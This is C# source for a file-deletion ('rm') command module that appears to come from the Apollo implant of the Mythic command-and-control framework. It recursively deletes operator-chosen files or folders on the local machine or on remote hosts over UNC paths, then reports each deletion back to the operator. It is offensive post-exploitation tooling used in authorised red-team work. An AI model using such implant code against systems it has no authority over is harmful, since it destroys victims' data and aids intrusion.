#define COMMAND_NAME_UPPER

#if DEBUG
#define RM
#endif

#if RM

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class rm : Tasking
    {
        [DataContract]
        internal struct RmParameters
        {
            [DataMember(Name = "host")]
            public string Host;
            [DataMember(Name = "path")]
            public string Path;
            [DataMember(Name = "file")]
            public string File;
        }
        public rm(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
        }

        public override void Kill()
        {
            base.Kill();
        }

        public override ST.Task CreateTasking()
        {
            return new ST.Task(() =>
            {
                TaskResponse resp;
                RmParameters parameters = _jsonSerializer.Deserialize<RmParameters>(_data.Parameters);
                string path = string.IsNullOrEmpty(parameters.File) ? parameters.Path : Path.Combine(new string[] { parameters.Path, parameters.File });
                string rmFilePath = path;
                string host = parameters.Host;
                if (string.IsNullOrEmpty(host))
                {
                    host = Environment.GetEnvironmentVariable("COMPUTERNAME");
                } else if (host != Environment.GetEnvironmentVariable("COMPUTERNAME"))
                {
                    if (!path.StartsWith("\\\\"))
                    {
                        path = $"\\\\{host}\\{path}";
                    }
                }
                if (rmFilePath.StartsWith("\\\\"))
                {
                    string[] parts = rmFilePath.Split(new char[] { '\\' }, 4);
                    if (parts.Length != 4)
                    {
                        throw new Exception($"Failed to parse UNC path: {rmFilePath}");
                    }
                }
                if (ApolloInterop.Utils.PathUtils.TryGetExactPath(path, out string realPath))
                {
                    if (Directory.Exists(realPath))
                    {
                        try
                        {
                            Directory.Delete(realPath, true);
                            resp = CreateTaskResponse(
                                $"Deleted {realPath}", true, "completed", new IMythicMessage[1]
                                {
                                    Artifact.FileDelete(realPath)
                                });
                        }
                        catch (Exception ex)
                        {
                            resp = CreateTaskResponse(
                                $"Failed to delete {realPath}: {ex.Message}", true, "error");
                        }
                    } else
                    {
                        try
                        {
                            File.Delete(realPath);
                            resp = CreateTaskResponse(
                                $"Deleted {realPath}", true, "completed", new IMythicMessage[1]
                                {
                                    Artifact.FileDelete(realPath)
                                });
                        } catch (Exception ex)
                        {
                            resp = CreateTaskResponse(
                                $"Failed to delete {realPath}: {ex.Message}", true, "error");
                        }
                    }
                } else
                {
                    resp = CreateTaskResponse($"Cannot find file or folder: {parameters.Path}", true, "error");
                }
                if (resp.Status == "completed")
                {
                    resp.RemovedFiles = new RemovedFileInformation[1]
                    {
                        new RemovedFileInformation
                        {
                            Host = host,
                            Path = rmFilePath
                        }
                    };
                }
                // Your code here..
                // Then add response to queue
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }, _cancellationToken.Token);
        }
    }
}

#endif